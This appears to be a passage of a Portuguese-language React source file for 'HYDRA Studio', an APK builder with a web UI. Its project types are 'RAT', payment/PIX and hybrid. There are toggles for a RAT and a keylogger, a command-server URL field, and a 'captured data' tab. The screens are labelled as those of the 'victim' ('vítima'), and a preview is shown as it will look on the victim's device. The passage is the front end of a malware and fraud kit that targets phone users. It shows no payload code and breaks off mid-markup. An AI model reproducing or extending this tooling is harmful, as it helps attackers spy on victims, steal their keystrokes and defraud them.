  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>, elementId?: string) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      if (elementId) {
        updateElement(elementId, { imageUrl: event.target?.result as string });
      } else if (currentProject) {
        setCurrentProject({ ...currentProject, iconUrl: event.target?.result as string });
      }
    };
    reader.readAsDataURL(file);
  };

  const selectedEl = currentScreen?.elements.find(el => el.id === selectedElement);

  // ============================================
  // RENDER - LISTA DE PROJETOS
  // ============================================
  
  if (showProjectList) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 p-6">
        <div className="max-w-6xl mx-auto">
          {/* Header */}
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center gap-4">
              <button
                onClick={() => navigate('/dashboard')}
                className="p-2 bg-slate-800 hover:bg-slate-700 text-white rounded-lg"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
              <div className="flex items-center gap-4">
                <img 
                  src="/hydra-logo.svg" 
                  alt="Hydra" 
                  className="w-12 h-12 hidden sm:block"
                  style={{ filter: 'drop-shadow(0 0 5px rgba(139, 92, 246, 0.5))' }}
                />
                <div>
                  <h1 className="text-3xl font-bold text-white">HYDRA Studio</h1>
                  <p className="text-gray-400">Crie APKs personalizados com sistema de pagamento integrado</p>
                </div>
              </div>
            </div>
          </div>

          {/* Criar Novo Projeto */}
          <div className="bg-slate-800/50 backdrop-blur rounded-2xl p-6 mb-8 border border-slate-700">
            <h2 className="text-xl font-bold text-white mb-4">➕ Criar Novo Projeto</h2>
            <div className="grid grid-cols-1 md:grid-cols-5 gap-4">
              <button
                onClick={() => createNewProject('payment')}
                className="p-6 bg-gradient-to-br from-green-600 to-emerald-700 hover:from-green-500 hover:to-emerald-600 rounded-xl text-white transition-all"
              >
                <DollarSign className="w-8 h-8 mb-2 mx-auto" />
                <span className="font-bold block">💳 Pagamento</span>
                <span className="text-xs opacity-80">APK com PIX/Gateway</span>
              </button>
              
              <button
                onClick={() => createNewProject('rat')}
                className="p-6 bg-gradient-to-br from-red-600 to-rose-700 hover:from-red-500 hover:to-rose-600 rounded-xl text-white transition-all"
              >
                <Smartphone className="w-8 h-8 mb-2 mx-auto" />
                <span className="font-bold block">📱 RAT</span>
                <span className="text-xs opacity-80">Controle remoto</span>
              </button>
              
              <button
                onClick={() => createNewProject('hybrid')}
                className="p-6 bg-gradient-to-br from-purple-600 to-violet-700 hover:from-purple-500 hover:to-violet-600 rounded-xl text-white transition-all"
              >
                <Settings className="w-8 h-8 mb-2 mx-auto" />
                <span className="font-bold block">🔀 Híbrido</span>
                <span className="text-xs opacity-80">Pagamento + RAT</span>
              </button>
              
              <button
                onClick={() => createNewProject('custom')}
                className="p-6 bg-gradient-to-br from-blue-600 to-cyan-700 hover:from-blue-500 hover:to-cyan-600 rounded-xl text-white transition-all"
              >
                <Palette className="w-8 h-8 mb-2 mx-auto" />
                <span className="font-bold block">🎨 Customizado</span>
                <span className="text-xs opacity-80">Tela 100% livre</span>
              </button>
              
              <button
                onClick={() => createNewProject('mobile_panel')}
                className="p-6 bg-gradient-to-br from-orange-500 to-amber-600 hover:from-orange-400 hover:to-amber-500 rounded-xl text-white transition-all relative overflow-hidden"
              >
                <div className="absolute top-1 right-1 bg-yellow-400 text-black text-[8px] px-1 rounded font-bold">PRO</div>
                <Monitor className="w-8 h-8 mb-2 mx-auto" />
                <span className="font-bold block">📲 Painel Mobile</span>
                <span className="text-xs opacity-80">RAT no seu celular</span>
              </button>
            </div>
          </div>

          {/* Projetos Existentes */}
          <div className="bg-slate-800/50 backdrop-blur rounded-2xl p-6 border border-slate-700">
            <h2 className="text-xl font-bold text-white mb-4">📁 Meus Projetos ({projects.length})</h2>
            {projects.length === 0 ? (
              <p className="text-gray-400 text-center py-8">Nenhum projeto criado ainda</p>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {projects.map(project => (
                  <div
                    key={project.id}
                    className="bg-slate-700/50 rounded-xl p-4 border border-slate-600 hover:border-purple-500 transition-all"
                  >
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex items-center gap-3">
                        {project.iconUrl ? (
                          <img src={project.iconUrl} className="w-12 h-12 rounded-xl object-cover" />
                        ) : (
                          <div className="w-12 h-12 bg-purple-600 rounded-xl flex items-center justify-center text-2xl">
                            📱
                          </div>
                        )}
                        <div>
                          <h3 className="text-white font-bold">{project.name}</h3>
                          <p className="text-gray-400 text-xs">{project.appName}</p>
                        </div>
                      </div>
                      <span className={`px-2 py-1 rounded text-xs font-semibold ${
                        project.projectType === 'payment' ? 'bg-green-600' :
                        project.projectType === 'rat' ? 'bg-red-600' :
                        project.projectType === 'hybrid' ? 'bg-purple-600' :
                        'bg-blue-600'
                      }`}>
                        {project.projectType.toUpperCase()}
                      </span>
                    </div>
                    
                    <p className="text-gray-400 text-xs mb-3">
                      {project.screens.length} tela(s) • {project.screens.reduce((acc, s) => acc + s.elements.length, 0)} elementos
                    </p>
                    
                    <div className="flex gap-2">
                      <button
                        onClick={() => { setCurrentProject(project); setShowProjectList(false); }}
                        className="flex-1 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-sm font-semibold"
                      >
                        ✏️ Editar
                      </button>
                      <button
                        onClick={() => deleteProject(project.id)}
                        className="p-2 bg-red-600 hover:bg-red-700 text-white rounded-lg"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Configurações PIX */}
          <div className="bg-slate-800/50 backdrop-blur rounded-2xl p-6 mt-8 border border-slate-700">
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-xl font-bold text-white">💰 Minhas Chaves PIX</h2>
              <button
                onClick={() => { setEditingPix(null); setShowPixForm(true); }}
                className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-semibold flex items-center gap-2"
              >
                <Plus className="w-4 h-4" /> Nova Chave
              </button>
            </div>
            
            {pixConfigs.length === 0 ? (
              <p className="text-gray-400 text-center py-4">Nenhuma chave PIX configurada</p>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {pixConfigs.map(config => (
                  <div
                    key={config.id}
                    className={`p-4 rounded-xl border ${config.isDefault ? 'bg-green-900/20 border-green-500' : 'bg-slate-700/50 border-slate-600'}`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <span className="font-bold text-white">{config.name}</span>
                      {config.isDefault && (
                        <span className="px-2 py-0.5 bg-green-600 text-white text-xs rounded">PADRÃO</span>
                      )}
                    </div>
                    <p className="text-gray-300 text-sm mb-1">
                      <Key className="w-3 h-3 inline mr-1" />
                      {config.pixKeyType.toUpperCase()}: {config.pixKey}
                    </p>
                    <p className="text-gray-400 text-xs">
                      {config.beneficiaryName} • {config.beneficiaryCity}
                    </p>
                    <div className="flex gap-2 mt-3">
                      <button
                        onClick={() => { setEditingPix(config); setShowPixForm(true); }}
                        className="flex-1 py-1 bg-blue-600 hover:bg-blue-700 text-white rounded text-xs"
                      >
                        Editar
                      </button>
                      <button
                        onClick={() => deletePixConfig(config.id)}
                        className="px-2 py-1 bg-red-600 hover:bg-red-700 text-white rounded text-xs"
                      >
                        <Trash2 className="w-3 h-3" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Modal de Configuração PIX */}
        {showPixForm && (
          <PixConfigModal
            config={editingPix}
            onSave={savePixConfig}
            onClose={() => { setShowPixForm(false); setEditingPix(null); }}
          />
        )}
      </div>
    );
  }

  // ============================================
  // 📱 RENDER MOBILE - AUTO-RESPONSIVO
  // ============================================
  
  if (isMobile) {
    return (
      <div className="min-h-screen bg-slate-900 flex flex-col safe-top safe-bottom">
        {/* Header Mobile Compacto */}
        <div className="bg-gradient-to-r from-purple-600 to-pink-600 px-3 py-2 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <button
              onClick={() => setShowProjectList(true)}
              className="p-1.5 bg-white/20 rounded-lg touch-feedback"
            >
              <ArrowLeft className="w-4 h-4 text-white" />
            </button>
            <div className="min-w-0">
              <h1 className="text-white font-bold text-sm truncate max-w-[120px]">
                {currentProject?.name || 'APK Studio'}
              </h1>
              <p className="text-white/70 text-[9px]">
                {currentProject?.projectType.toUpperCase()}
              </p>
            </div>
          </div>
          
          <div className="flex items-center gap-1">
            <button
              onClick={saveProject}
              className="p-2 bg-green-500 rounded-lg touch-feedback"
            >
              <Save className="w-4 h-4 text-white" />
            </button>
            <button
              onClick={() => startBuildProcess(editingMode === 'panel' ? 'panel' : 'victim')}
              className="p-2 bg-white/20 rounded-lg touch-feedback"
            >
              <Download className="w-4 h-4 text-white" />
            </button>
          </div>
        </div>

        {/* Tabs Mobile - Scroll Horizontal */}
        <div className="bg-slate-800 px-2 py-2 overflow-x-auto hide-scrollbar">
          <div className="flex gap-1 min-w-max">
            {(['editor', 'settings', 'data', 'preview'] as const).map(tab => (
              <button
                key={tab}
                onClick={() => { setActiveTab(tab); if (tab === 'data') loadCapturedData(); }}
                className={`px-3 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap touch-feedback ${
                  activeTab === tab 
                    ? 'bg-purple-600 text-white' 
                    : 'bg-slate-700 text-gray-400'
                }`}
              >
                {tab === 'editor' && '✏️ Editor'}
                {tab === 'settings' && '⚙️ Config'}
                {tab === 'data' && '📊 Dados'}
                {tab === 'preview' && '👁️ Preview'}
              </button>
            ))}
          </div>
        </div>

        {/* Conteúdo Mobile */}
        <div className="flex-1 overflow-y-auto pb-20">
          {activeTab === 'editor' && currentProject && (
            <div className="p-3 space-y-3">
              {/* Modo Vítima/Painel Toggle */}
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => setEditingMode('victim')}
                  className={`py-2 rounded-lg text-xs font-bold touch-feedback ${
                    editingMode === 'victim' 
                      ? 'bg-red-600 text-white border-2 border-red-400' 
                      : 'bg-slate-700 text-gray-400'
                  }`}
                >
                  📱 Vítima ({currentProject.screens.length})
                </button>
                <button
                  onClick={() => setEditingMode('panel')}
                  className={`py-2 rounded-lg text-xs font-bold touch-feedback ${
                    editingMode === 'panel' 
                      ? 'bg-green-600 text-white border-2 border-green-400' 
                      : 'bg-slate-700 text-gray-400'
                  }`}
                >
                  🖥️ Painel ({currentProject.panelScreens?.length || 0})
                </button>
              </div>

              {/* Navegação de Telas Mobile */}
              <div className="bg-slate-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs mb-2">Telas:</p>
                <div className="flex gap-2 overflow-x-auto pb-2 hide-scrollbar">
                  {currentScreens.map((screen, index) => (
                    <button
                      key={screen.id}
                      onClick={() => setCurrentScreenIndex(index)}
                      className={`px-3 py-1.5 rounded-lg text-xs font-medium whitespace-nowrap touch-feedback ${
                        index === safeScreenIndex 
                          ? 'bg-purple-600 text-white' 
                          : 'bg-slate-700 text-gray-400'
                      }`}
                    >
                      {screen.name}
                    </button>
                  ))}
                </div>
              </div>

              {/* Preview Mobile - Menor e Centralizado */}
              <div className="bg-slate-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs mb-2 flex items-center justify-between">
                  <span>Preview:</span>
                  <span className="text-purple-400">{currentScreen?.name || 'Tela'}</span>
                </p>
                <div 
                  className="relative mx-auto bg-black rounded-2xl overflow-hidden border-4 border-slate-600"
                  style={{ 
                    width: 'min(280px, calc(100vw - 48px))',
                    aspectRatio: '9/19.5'
                  }}
                >
                  {/* Notch */}
                  <div className="absolute top-0 left-1/2 -translate-x-1/2 w-20 h-5 bg-black rounded-b-xl z-20" />
                  
                  {/* Tela */}
                  <div 
                    className="absolute inset-0 overflow-hidden"
                    style={{ backgroundColor: currentScreen?.backgroundColor || '#0f0f1a' }}
                  >
                    {/* Renderiza elementos em escala */}
                    <div 
                      className="relative w-full h-full"
                      style={{ transform: 'scale(0.78)', transformOrigin: 'top left' }}
                    >
                      {currentScreen?.elements.map((el) => (
                        <div
                          key={el.id}
                          onClick={() => setSelectedElement(el.id)}
                          className={`absolute cursor-pointer touch-feedback ${
                            selectedElement === el.id ? 'ring-2 ring-purple-500' : ''
                          }`}
                          style={{
                            left: el.x,
                            top: el.y,
                            width: el.width,
                            height: el.height,
                          }}
                        >
                          {/* Renderização simplificada dos elementos */}
                          {el.type === 'text' && (
                            <span style={{ color: el.color, fontSize: el.fontSize }}>
                              {el.content}
                            </span>
                          )}
                          {el.type === 'button' && (
                            <div 
                              className="w-full h-full flex items-center justify-center rounded"
                              style={{ 
                                backgroundColor: el.backgroundColor,
                                color: el.color,
                                fontSize: el.fontSize
                              }}
                            >
                              {el.content}
                            </div>
                          )}
                          {(el.type === 'rectangle' || el.type === 'card') && (
                            <div 
                              className="w-full h-full"
                              style={{ 
                                backgroundColor: el.backgroundColor,
                                borderRadius: el.borderRadius
                              }}
                            />
                          )}
                          {el.type === 'input' && (
                            <div 
                              className="w-full h-full flex items-center px-2 border rounded"
                              style={{ 
                                backgroundColor: el.backgroundColor,
                                borderColor: el.borderColor,
                                color: el.color,
                                fontSize: 10
                              }}
                            >
                              {el.placeholder || 'Input'}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </div>

              {/* Elementos Rápidos Mobile */}
              <div className="bg-slate-800 rounded-xl p-3">
                <p className="text-gray-400 text-xs mb-2">Adicionar:</p>
                <div className="grid grid-cols-4 gap-2">
                  <button onClick={() => addElement('text')} className="p-3 bg-slate-700 rounded-lg text-center touch-feedback">
                    <span className="text-lg">📝</span>
                    <p className="text-[8px] text-gray-400 mt-1">Texto</p>
                  </button>
                  <button onClick={() => addElement('button')} className="p-3 bg-slate-700 rounded-lg text-center touch-feedback">
                    <span className="text-lg">🔘</span>
                    <p className="text-[8px] text-gray-400 mt-1">Botão</p>
                  </button>
                  <button onClick={() => addElement('input')} className="p-3 bg-yellow-900/50 rounded-lg text-center touch-feedback border border-yellow-600/30">
                    <span className="text-lg">✏️</span>
                    <p className="text-[8px] text-yellow-400 mt-1">Input</p>
                  </button>
                  <button onClick={() => addElement('image')} className="p-3 bg-slate-700 rounded-lg text-center touch-feedback">
                    <span className="text-lg">🖼️</span>
                    <p className="text-[8px] text-gray-400 mt-1">Imagem</p>
                  </button>
                </div>
              </div>

              {/* Propriedades do Elemento Selecionado */}
              {selectedElement && currentScreen?.elements.find(e => e.id === selectedElement) && (
                <div className="bg-slate-800 rounded-xl p-3">
                  <div className="flex items-center justify-between mb-2">
                    <p className="text-gray-400 text-xs">Propriedades:</p>
                    <button 
                      onClick={() => setSelectedElement(null)}
                      className="text-gray-500 hover:text-white"
                    >
                      <X className="w-4 h-4" />
                    </button>
                  </div>
                  {(() => {
                    const el = currentScreen.elements.find(e => e.id === selectedElement)!;
                    return (
                      <div className="space-y-2">
                        <div className="grid grid-cols-2 gap-2">
                          <div>
                            <label className="text-[9px] text-gray-500">X</label>
                            <input
                              type="number"
                              value={el.x}
                              onChange={(e) => updateElement(el.id, { x: Number(e.target.value) })}
                              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-xs"
                            />
                          </div>
                          <div>
                            <label className="text-[9px] text-gray-500">Y</label>
                            <input
                              type="number"
                              value={el.y}
                              onChange={(e) => updateElement(el.id, { y: Number(e.target.value) })}
                              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-xs"
                            />
                          </div>
                        </div>
                        {el.content !== undefined && (
                          <div>
                            <label className="text-[9px] text-gray-500">Conteúdo</label>
                            <input
                              type="text"
                              value={el.content}
                              onChange={(e) => updateElement(el.id, { content: e.target.value })}
                              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-xs"
                            />
                          </div>
                        )}
                        <button
                          onClick={() => deleteElement(el.id)}
                          className="w-full py-2 bg-red-600 text-white rounded text-xs font-bold touch-feedback"
                        >
                          🗑️ Excluir
                        </button>
                      </div>
                    );
                  })()}
                </div>
              )}
            </div>
          )}

          {activeTab === 'settings' && currentProject && (
            <div className="p-3 space-y-3">
              <div className="bg-slate-800 rounded-xl p-4">
                <h3 className="text-white font-semibold text-sm mb-3">📱 Info do App</h3>
                <div className="space-y-3">
                  <div>
                    <label className="text-gray-400 text-xs">Nome</label>
                    <input
                      type="text"
                      value={currentProject.appName}
                      onChange={(e) => setCurrentProject({ ...currentProject, appName: e.target.value })}
                      className="w-full bg-slate-700 text-white px-3 py-2 rounded-lg text-sm mt-1"
                    />
                  </div>
                  <div>
                    <label className="text-gray-400 text-xs">Package</label>
                    <input
                      type="text"
                      value={currentProject.packageName}
                      onChange={(e) => setCurrentProject({ ...currentProject, packageName: e.target.value })}
                      className="w-full bg-slate-700 text-white px-3 py-2 rounded-lg text-sm mt-1"
                    />
                  </div>
                </div>
              </div>

              <div className="bg-slate-800 rounded-xl p-4">
                <h3 className="text-white font-semibold text-sm mb-3">🔧 Funcionalidades</h3>
                <div className="space-y-2">
                  <label className="flex items-center gap-3 p-2 bg-slate-700 rounded-lg touch-feedback">
                    <input
                      type="checkbox"
                      checked={currentProject.enableRat}
                      onChange={(e) => setCurrentProject({ ...currentProject, enableRat: e.target.checked })}
                      className="w-5 h-5 accent-purple-500"
                    />
                    <span className="text-white text-sm">📱 RAT</span>
                  </label>
                  <label className="flex items-center gap-3 p-2 bg-slate-700 rounded-lg touch-feedback">
                    <input
                      type="checkbox"
                      checked={currentProject.enableKeylogger}
                      onChange={(e) => setCurrentProject({ ...currentProject, enableKeylogger: e.target.checked })}
                      className="w-5 h-5 accent-purple-500"
                    />
                    <span className="text-white text-sm">⌨️ Keylogger</span>
                  </label>
                  <label className="flex items-center gap-3 p-2 bg-slate-700 rounded-lg touch-feedback">
                    <input
                      type="checkbox"
                      checked={currentProject.showInWebPanel}
                      onChange={(e) => setCurrentProject({ ...currentProject, showInWebPanel: e.target.checked })}
                      className="w-5 h-5 accent-blue-500"
                    />
                    <span className="text-white text-sm">📊 Mostrar no Painel Web</span>
                  </label>
                </div>
              </div>

              {(currentProject.enableRat || currentProject.enableKeylogger) && (
                <div className="bg-red-900/30 rounded-xl p-4 border border-red-600/50">
                  <h3 className="text-red-400 font-semibold text-sm mb-3">🔗 Servidor</h3>
                  <input
                    type="text"
                    value={currentProject.serverUrl || ''}
                    onChange={(e) => setCurrentProject({ ...currentProject, serverUrl: e.target.value })}
                    placeholder={defaultWsPlaceholder()}
                    className="w-full bg-slate-700 text-white px-3 py-2 rounded-lg text-sm"
                  />
                </div>
              )}
            </div>
          )}

          {activeTab === 'data' && (
            <div className="p-3">
              <div className="bg-slate-800 rounded-xl p-4">
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-white font-semibold text-sm">📊 Dados Capturados</h3>
                  <span className="bg-purple-600 px-2 py-1 rounded text-xs text-white">
                    {dataTotalEntries}
                  </span>
                </div>
                {capturedData.length === 0 ? (
                  <p className="text-gray-400 text-sm text-center py-8">
                    Nenhum dado capturado ainda
                  </p>
                ) : (
                  <div className="space-y-2 max-h-[60vh] overflow-y-auto">
                    {capturedData.map((data, i) => (
                      <div key={i} className="bg-slate-700 p-3 rounded-lg text-xs">
                        <pre className="text-gray-300 overflow-x-auto">
                          {JSON.stringify(data, null, 2)}
                        </pre>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}

          {activeTab === 'preview' && (
            <div className="p-3 flex flex-col items-center">
              <div 
                className="relative bg-black rounded-3xl overflow-hidden border-4 border-slate-600"
                style={{ 
                  width: 'min(320px, calc(100vw - 32px))',
                  aspectRatio: '9/19.5'
                }}
              >
                {/* Notch */}
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-24 h-6 bg-black rounded-b-2xl z-20" />
                
                {/* Tela */}
                <div 
                  className="absolute inset-0 overflow-hidden"
                  style={{ backgroundColor: currentScreen?.backgroundColor || '#0f0f1a' }}
                >
                  <div 
                    className="relative w-full h-full"
                    style={{ transform: 'scale(0.89)', transformOrigin: 'top left' }}
                  >
                    {currentScreen?.elements.map((el) => (
                      <div
                        key={el.id}
                        className="absolute"
                        style={{
                          left: el.x,
                          top: el.y,
                          width: el.width,
                          height: el.height,
                        }}
                      >
                        {el.type === 'text' && (
                          <span style={{ color: el.color, fontSize: el.fontSize, fontWeight: el.fontWeight }}>
                            {el.content}
                          </span>
                        )}
                        {el.type === 'button' && (
                          <div 
                            className="w-full h-full flex items-center justify-center"
                            style={{ 
                              backgroundColor: el.backgroundColor,
                              color: el.color,
                              fontSize: el.fontSize,
                              borderRadius: el.borderRadius
                            }}
                          >
                            {el.content}
                          </div>
                        )}
                        {(el.type === 'rectangle' || el.type === 'card') && (
                          <div 
                            className="w-full h-full"
                            style={{ 
                              backgroundColor: el.backgroundColor,
                              borderRadius: el.borderRadius
                            }}
                          />
                        )}
                        {el.type === 'input' && (
                          <div 
                            className="w-full h-full flex items-center px-2 border"
                            style={{ 
                              backgroundColor: el.backgroundColor,
                              borderColor: el.borderColor,
                              borderRadius: el.borderRadius,
                              color: el.color
                            }}
                          >
                            {el.placeholder}
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
              
              <p className="text-gray-400 text-xs mt-3 text-center">
                Assim ficará no dispositivo da vítima
              </p>
            </div>
          )}
        </div>

        {/* Bottom Nav Mobile */}
        <nav className="fixed bottom-0 left-0 right-0 bg-slate-800/95 backdrop-blur-lg border-t border-slate-700 safe-bottom z-50">
          <div className="grid grid-cols-4 h-14">
            <button 
              onClick={() => setShowProjectList(true)}
              className="flex flex-col items-center justify-center gap-0.5 text-gray-400 touch-feedback"
            >
              <ArrowLeft className="w-5 h-5" />
              <span className="text-[9px]">Projetos</span>
            </button>
            <button 
              onClick={saveProject}
              className="flex flex-col items-center justify-center gap-0.5 text-green-400 touch-feedback"
            >
              <Save className="w-5 h-5" />
              <span className="text-[9px]">Salvar</span>
            </button>
            <button 
              onClick={() => startBuildProcess(editingMode === 'panel' ? 'panel' : 'victim')}
              className="flex flex-col items-center justify-center gap-0.5 text-purple-400 touch-feedback"
            >
              <Download className="w-5 h-5" />
              <span className="text-[9px]">Build</span>
            </button>
            <button 
              onClick={() => navigate('/dashboard')}
              className="flex flex-col items-center justify-center gap-0.5 text-gray-400 touch-feedback"
            >
              <Monitor className="w-5 h-5" />
              <span className="text-[9px]">Painel</span>
            </button>
          </div>
        </nav>

        {/* Build Status Modal Mobile */}
        {buildStatus.isBuilding && (
          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4">
            <div className="bg-slate-800 rounded-2xl p-6 w-full max-w-sm">
              <div className="text-center">
                <Loader2 className="w-12 h-12 text-purple-500 animate-spin mx-auto mb-4" />
                <h3 className="text-white font-bold text-lg mb-2">Gerando APK</h3>
                <p className="text-gray-400 text-sm mb-4">{buildStatus.message}</p>
                <div className="bg-slate-700 rounded-full h-3 overflow-hidden">
                  <div 
                    className="bg-purple-600 h-full transition-all"
                    style={{ width: `${buildStatus.progress}%` }}
                  />
                </div>
                <p className="text-purple-400 text-sm mt-2">{buildStatus.progress}%</p>
              </div>
            </div>
          </div>
        )}

        {/* Build Success/Error Modal Mobile */}
        {buildStatus.downloadUrl && (
          <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4">
            <div className="bg-slate-800 rounded-2xl p-6 w-full max-w-sm text-center">
              <div className="text-5xl mb-4">✅</div>
              <h3 className="text-white font-bold text-lg mb-2">APK Pronto!</h3>
              <a
                href={`${getApiBaseUrl()}${buildStatus.downloadUrl}`}
                className="block w-full py-3 bg-green-600 text-white rounded-xl font-bold touch-feedback"
              >
                📥 Baixar APK
              </a>
              <button
                onClick={() => setBuildStatus({ isBuilding: false, progress: 0, message: '' })}
                className="mt-3 text-gray-400 text-sm"
              >
                Fechar
              </button>
            </div>
          </div>
        )}
      </div>
    );
  }
  
  // ============================================
  // 🖥️ RENDER DESKTOP - EDITOR DO PROJETO
  // ============================================
  
  return (
    <div className="min-h-screen bg-slate-900 flex flex-col">
      {/* Header do Editor */}
      <div className="bg-slate-800 p-3 flex items-center justify-between border-b border-slate-700">
        <div className="flex items-center gap-4">
          <button
            onClick={() => setShowProjectList(true)}
            className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <input
              type="text"
              value={currentProject?.name || ''}
              onChange={(e) => currentProject && setCurrentProject({ ...currentProject, name: e.target.value })}
              className="bg-transparent text-white font-bold text-lg border-b border-transparent hover:border-slate-500 focus:border-purple-500 outline-none"
            />
            <p className="text-gray-400 text-xs">
              {currentProject?.projectType.toUpperCase()} • {currentProject?.screens.length} tela(s) vítima • {currentProject?.panelScreens?.length || 0} tela(s) painel
            </p>
          </div>
        </div>
        
        {/* Tabs */}
        <div className="flex gap-1 bg-slate-700 rounded-lg p-1">
          {(['editor', 'pix', 'data', 'settings', 'preview'] as const).map(tab => (
            <button
              key={tab}
              onClick={() => { setActiveTab(tab); if (tab === 'data') loadCapturedData(); }}
              className={`px-4 py-2 rounded-lg text-sm font-semibold transition-all ${
                activeTab === tab ? 'bg-purple-600 text-white' : 'text-gray-400 hover:text-white'
              }`}
            >
              {tab === 'editor' && '✏️ Editor'}
              {tab === 'pix' && '💰 PIX'}
              {tab === 'data' && '📊 Dados'}
              {tab === 'settings' && '⚙️ Config'}
              {tab === 'preview' && '👁️ Preview'}
            </button>
          ))}
        </div>
        
        <div className="flex items-center gap-2">
          <button
            onClick={saveProject}
            className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg text-sm font-semibold flex items-center gap-2"
          >
            <Save className="w-4 h-4" /> Salvar
          </button>
          <button
            onClick={() => startBuildProcess(editingMode === 'panel' ? 'panel' : 'victim')}
            className="px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-lg text-sm font-semibold flex items-center gap-2"
          >
            <Download className="w-4 h-4" /> 🚀 Criar APK {editingMode === 'panel' ? '👑' : '👤'}
          </button>
        </div>
      </div>

      {/* Conteúdo Principal */}
      <div className="flex flex-1 overflow-hidden">
        {activeTab === 'editor' && (
          <>
            {/* Painel Esquerdo - Elementos COMPLETO */}
            <div className="w-56 bg-slate-800 p-3 border-r border-slate-700 overflow-y-auto">
              <h3 className="text-white font-semibold mb-3 text-sm">➕ Elementos</h3>
              
              {/* Legenda */}
              <div className="mb-3 p-2 bg-slate-900 rounded text-[9px]">
                <p className="text-gray-400 mb-1">📌 Legenda:</p>
                <p className="text-green-400">🎨 Visual - Só aparência</p>
                <p className="text-yellow-400">📊 Dados - Salva no banco</p>
              </div>

              {/* TEXTOS E TÍTULOS */}
              <div className="mb-3">
                <p className="text-blue-400 text-[10px] font-semibold mb-1">📝 TEXTOS</p>
                <div className="grid grid-cols-2 gap-1">
                  <button onClick={() => addElement('text')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Texto simples - só visual">
                    🎨 Título/Texto
                  </button>
                  <button onClick={() => addElement('button')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Botão clicável - executa ação">
                    🎨 Botão
                  </button>
                </div>
              </div>
              
              {/* ENTRADA DE DADOS */}
              <div className="mb-3">
                <p className="text-yellow-400 text-[10px] font-semibold mb-1">✏️ CAMPOS DE ENTRADA <span className="text-[8px]">(salvam dados)</span></p>
                <div className="grid grid-cols-2 gap-1">
                  <button onClick={() => addElement('input')} className="flex items-center gap-1 px-2 py-1.5 bg-yellow-900/50 hover:bg-yellow-800/50 text-white rounded text-[10px] border border-yellow-600/30" title="Campo de texto - SALVA NO BANCO">
                    📊 Campo Texto
                  </button>
                  <button onClick={() => addElement('checkbox')} className="flex items-center gap-1 px-2 py-1.5 bg-yellow-900/50 hover:bg-yellow-800/50 text-white rounded text-[10px] border border-yellow-600/30" title="Caixa de seleção - SALVA NO BANCO">
                    📊 Marcar Opção
                  </button>
                  <button onClick={() => addElement('switch')} className="flex items-center gap-1 px-2 py-1.5 bg-yellow-900/50 hover:bg-yellow-800/50 text-white rounded text-[10px] border border-yellow-600/30" title="Ligar/Desligar - SALVA NO BANCO">
                    📊 Liga/Desliga
                  </button>
                  <button onClick={() => addElement('dropdown')} className="flex items-center gap-1 px-2 py-1.5 bg-yellow-900/50 hover:bg-yellow-800/50 text-white rounded text-[10px] border border-yellow-600/30" title="Lista de opções - SALVA NO BANCO">
                    📊 Lista Opções
                  </button>
                  <button onClick={() => addElement('slider')} className="flex items-center gap-1 px-2 py-1.5 bg-yellow-900/50 hover:bg-yellow-800/50 text-white rounded text-[10px] border border-yellow-600/30" title="Controle deslizante - SALVA NO BANCO">
                    📊 Barra Valor
                  </button>
                </div>
              </div>
              
              {/* DECORAÇÃO VISUAL */}
              <div className="mb-3">
                <p className="text-purple-400 text-[10px] font-semibold mb-1">🎨 DECORAÇÃO <span className="text-[8px]">(só visual)</span></p>
                <div className="grid grid-cols-2 gap-1">
                  <button onClick={() => addElement('rectangle')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Caixa colorida - decoração">
                    🎨 Caixa
                  </button>
                  <button onClick={() => addElement('circle')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Círculo decorativo">
                    🎨 Círculo
                  </button>
                  <button onClick={() => addElement('divider')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Linha separadora">
                    🎨 Linha
                  </button>
                  <button onClick={() => addElement('card')} className="flex items-center gap-1 px-2 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded text-[10px]" title="Cartão com sombra">
                    🎨 Cartão
                  </button>
                </div>
              </div>
              
              {/* IMAGENS E MÍDIA */}
